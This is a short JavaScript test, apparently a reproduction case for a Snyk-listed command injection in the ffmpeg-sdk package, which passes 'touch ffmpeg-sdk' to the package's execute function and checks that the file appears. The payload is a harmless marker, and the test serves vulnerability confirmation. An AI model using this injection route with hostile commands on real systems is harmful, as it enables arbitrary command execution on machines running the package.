//https://snyk.io/vuln/SNYK-JS-FFMPEGSDK-1050429
test("Command Injection in ffmpeg-sdk", () => {
  const root = require("ffmpeg-sdk");
  const fs = require("fs");
  const path = "./ffmpeg-sdk";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  root.execute("touch ffmpeg-sdk");

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
